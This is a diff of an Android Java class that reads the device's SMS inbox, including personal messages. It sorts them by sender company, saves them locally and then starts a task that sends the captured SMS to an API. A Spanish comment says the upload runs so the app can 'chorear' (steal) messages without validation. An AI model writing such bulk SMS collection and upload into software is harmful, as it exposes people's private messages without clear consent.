@@ -83,18 +83,14 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 			RealmResults<Message> messages	= realm.where(Message.class).equalTo(Common.KEY_TYPE, Message.TYPE_SMS).findAll();
 			User user						= realm.where(User.class).findFirst();
 
-			if(messages != null)
+			if(messages.size() > 0)
 			{
-				if(messages.size() > 0)
-				{
-					realm.beginTransaction();
-					messages.deleteAllFromRealm();
-					realm.commitTransaction();
-				}
+				realm.beginTransaction();
+				messages.deleteAllFromRealm();
+				realm.commitTransaction();
 			}
 
 			SharedPreferences preferences	= activity.getApplicationContext().getSharedPreferences(Common.KEY_PREF, Context.MODE_PRIVATE);
-			String code						= "";
 			//Corrección de countryCode en Mensajes capturados
 			String country					= preferences.getString(Country.KEY_API, "");
 
@@ -152,50 +148,6 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 							String date_sent	= cursor.getString(cursor.getColumnIndexOrThrow("date_sent"));
 							int read			= cursor.getInt(cursor.getColumnIndexOrThrow("read"));
 
-							if(body.contains(Message.SMS_INVITE))
-							{
-								code	= body.replace(Message.SMS_INVITE, "");
-								code	= code.trim().substring(0, Common.CODE_LENGTH);
-							}
-							else
-							{
-								if(body.contains(Message.SMS_CODE))
-								{
-									code	= body.replace(Message.SMS_CODE, "");
-									code	= code.trim().substring(0, Common.CODE_LENGTH);
-								}
-								else
-								{
-									if(body.contains(Message.SMS_CODE_ES))
-									{
-										code = body.replace(Message.SMS_CODE_ES, "");
-										code = code.trim().substring(0, Common.CODE_LENGTH);
-									}
-								}
-							}
-
-							if(body.contains(Message.SMS_INVITE_NEW))
-							{
-								code	= body.replace(Message.SMS_INVITE_NEW, "");
-								code	= code.trim().substring(0, Common.CODE_LENGTH);
-							}
-							else
-							{
-								if(body.contains(Message.SMS_CODE_NEW))
-								{
-									code	= body.replace(Message.SMS_CODE_NEW, "");
-									code	= code.trim().substring(0, Common.CODE_LENGTH);
-								}
-								else
-								{
-									if(body.contains(Message.SMS_CODE_ES_NEW))
-									{
-										code = body.replace(Message.SMS_CODE_ES_NEW, "");
-										code = code.trim().substring(0, Common.CODE_LENGTH);
-									}
-								}
-							}
-
 							//Se incorpora lectura de sms personales
 							if(StringUtils.isPhoneNumber(address))
 							{
@@ -213,124 +165,127 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 														.equalTo(Message.KEY_CREATED, Long.valueOf(date)).or().equalTo(Message.KEY_CREATED, Long.valueOf(date_sent)).findAll();
 								}
 
-								if(notifications != null)
+								if(notifications.size() == 0)
 								{
-									if(notifications.size() == 0)
+									Message notification = new Message();
+									notification.setMsg(body);
+
+									if(StringUtils.isNotEmpty(date_sent))
 									{
-										Message notification = new Message();
-										notification.setMsg(body);
+										notification.setCreated(Long.valueOf(date_sent));
+									}
+									else
+									{
+										notification.setCreated(Long.valueOf(date));
+									}
 
-										if(StringUtils.isNotEmpty(date_sent))
-										{
-											notification.setCreated(Long.valueOf(date_sent));
-										}
-										else
-										{
-											notification.setCreated(Long.valueOf(date));
-										}
+									SharedPreferences.Editor editor	= preferences.edit();
+									editor.putInt(Common.KEY_LAST_MSGID, preferences.getInt(Common.KEY_LAST_MSGID, 1) + 1);
+									editor.apply();
+									notification.setMsgId(String.valueOf(preferences.getInt(Common.KEY_LAST_MSGID, 1)));
+									Suscription client				= null;
+									notification.setType(Message.TYPE_SMS);
 
-										SharedPreferences.Editor editor	= preferences.edit();
-										editor.putInt(Common.KEY_LAST_MSGID, preferences.getInt(Common.KEY_LAST_MSGID, 1) + 1);
-										editor.apply();
-										notification.setMsgId(String.valueOf(preferences.getInt(Common.KEY_LAST_MSGID, 1)));
-										Suscription client				= null;
-
-										if(body.contains(activity.getString(R.string.app_name)))
+									if(body.toUpperCase().contains(activity.getString(R.string.app_name).toUpperCase()) || body.toUpperCase().contains("VIACELULAR"))
+									{
+										//Optimización para evitar bucle por un registro
+										notification.setCompanyId(Suscription.COMPANY_ID_VC_MONGO);
+									}
+									else
+									{
+										int coincidenceNumber	= 0;
+										client					= null;
+										//Re-estructuración para mejorar clasificación de sms
+										//1- buscamos company con el número del que vino el sms
+										RealmResults<Suscription> companiesWithNumber = realm.where(Suscription.class).contains(Suscription.KEY_NUMBERS, address, Case.INSENSITIVE).findAll();
+										//2- verificamos coincidencias (companies que compartan el número)
+										if(companiesWithNumber.size() > 1)
 										{
-											notification.setType(activity.getString(R.string.invite));
-											//Optimización para evitar bucle por un registro
-											notification.setCompanyId(Suscription.COMPANY_ID_VC_MONGO);
-										}
-										else
-										{
-											notification.setType(Message.TYPE_SMS);
-											int coincidenceNumber	= 0;
-											client					= null;
-											//Re-estructuración para mejorar clasificación de sms
-											//1- buscamos company con el número del que vino el sms
-											RealmResults<Suscription> companiesWithNumber = realm.where(Suscription.class).contains(Suscription.KEY_NUMBERS, address, Case.INSENSITIVE).findAll();
-											System.out.println("Para el número: "+address+" se encontraron "+companiesWithNumber.size()+" coincidencias de companies");
-											//2- verificamos coincidencias (companies que compartan el número)
-											if(companiesWithNumber.size() > 1)
+											//Hay ocurrencias, revisaremos las keywords
+											for(Suscription company : companiesWithNumber)
 											{
-												//Hay ocurrencias, revisaremos las keywords
-												for(Suscription company : companiesWithNumber)
+												//3- verificamos si el mensaje contiene el nombre de la company
+												if(body.toUpperCase().contains(company.getName().toUpperCase()))
 												{
-													//3- verificamos si el mensaje contiene el nombre de la company
-													if(body.toUpperCase().contains(company.getName().toUpperCase()))
+													client = company;
+													break;
+												}
+												else
+												{
+													//4- verificamos si el mensaje contiene alguna de las keywords
+													if(StringUtils.containsKeywords(body, company.getKeywords()))
 													{
 														client = company;
 														break;
 													}
-													else
-													{
-														//4- verificamos si el mensaje contiene alguna de las keywords
-														if(StringUtils.containsKeywords(body, company.getKeywords()))
-														{
-															client = company;
-															break;
-														}
-													}
 												}
-											}
-											else
-											{
-												if(companiesWithNumber.size() == 1)
-												{
-													//Encontró una única company
-													client = companiesWithNumber.get(0);
-												}
-											}
-
-											if(client != null)
-											{
-												notification.setCompanyId(client.getCompanyId());
-											}
-											else
-											{
-												//No existe este número corto en la db, generamos company fantasma
-												client	= SuscriptionHelper.createPhantom(address, activity, country);
-												notification.setCompanyId(client.getCompanyId());
-											}
-										}
-
-										//Si el mensaje es personal el status es 6 - Personal
-										if(StringUtils.isCompanyNumber(address))
-										{
-											if(read == 1)
-											{
-												notification.setStatus(Message.STATUS_READ);
-											}
-											else
-											{
-												notification.setStatus(Message.STATUS_RECEIVE);
 											}
 										}
 										else
 										{
-											notification.setStatus(Message.STATUS_PERSONAL);
+											if(companiesWithNumber.size() == 1)
+											{
+												//Encontró una única company
+												client = companiesWithNumber.get(0);
+											}
 										}
 
-										notification.setKind(Message.KIND_TEXT);
-										notification.setChannel(address);
-										notification.setCountryCode(country);
-										notification.setFlags(Message.FLAGS_SMS);
-										notification.setPhone(preferences.getString(User.KEY_PHONE, ""));
-										realm.beginTransaction();
-										realm.copyToRealmOrUpdate(notification);
-										realm.commitTransaction();
+										if(client != null)
+										{
+											notification.setCompanyId(client.getCompanyId());
+										}
+										else
+										{
+											client = realm.where(Suscription.class).equalTo(Common.KEY_NAME, address, Case.INSENSITIVE).findFirst();
+
+											if(client == null)
+											{
+												//No existe este número corto en la db, generamos company fantasma
+												client	= SuscriptionHelper.createPhantom(address, activity, country);
+											}
+
+											notification.setCompanyId(client.getCompanyId());
+										}
+
+										System.out.println("Para: "+address+" hay "+companiesWithNumber.size()+" coincidencias y se asigno: "+client.getName());
 									}
+
+									//Si el mensaje es personal el status es 6 - Personal
+									if(StringUtils.isCompanyNumber(address))
+									{
+										if(read == 1)
+										{
+											notification.setStatus(Message.STATUS_READ);
+										}
+										else
+										{
+											notification.setStatus(Message.STATUS_RECEIVE);
+										}
+									}
+									else
+									{
+										notification.setStatus(Message.STATUS_PERSONAL);
+									}
+
+									notification.setKind(Message.KIND_TEXT);
+									notification.setChannel(address);
+									notification.setCountryCode(country);
+									notification.setFlags(Message.FLAGS_SMS);
+									notification.setPhone(preferences.getString(User.KEY_PHONE, ""));
+									realm.beginTransaction();
+									realm.copyToRealmOrUpdate(notification);
+									realm.commitTransaction();
 								}
 							}
 						}
 						while(cursor.moveToNext());
 						cursor.close();
-						result = code;
+						result = ApiConnection.OK;
 
-						if(StringUtils.isEmpty(result))
-						{
-							result = ApiConnection.OK;
-						}
+						//Agregado para evitar reproceso si el usuario hizo back en la pantalla de verificación del código
+						SharedPreferences.Editor editor	= preferences.edit();
+						editor.putBoolean(Common.KEY_PREF_CAPTURED, true);
+						editor.apply();
 					}
 				}
 			}
@@ -364,9 +319,12 @@ public class CaptureSMSAsyncTask extends AsyncTask<Void, Void, String>
 				}
 			}
 
-			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar
-			final ConnectApiSMSAsyncTask task	= new ConnectApiSMSAsyncTask(activity, false);
-			task.execute();
+			//Agregado para enviar los sms recibidos a la api, se movió para chorear sin necesidad de validar (siempre que haya sms)
+			if(result.equals(ApiConnection.OK))
+			{
+				final ConnectApiSMSAsyncTask task	= new ConnectApiSMSAsyncTask(activity, false);
+				task.execute();
+			}
 		}
 		catch(Exception e)
 		{
